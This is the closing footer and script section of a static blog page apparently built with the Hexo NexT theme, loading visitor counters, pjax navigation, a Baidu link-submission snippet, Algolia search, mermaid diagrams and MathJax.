        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
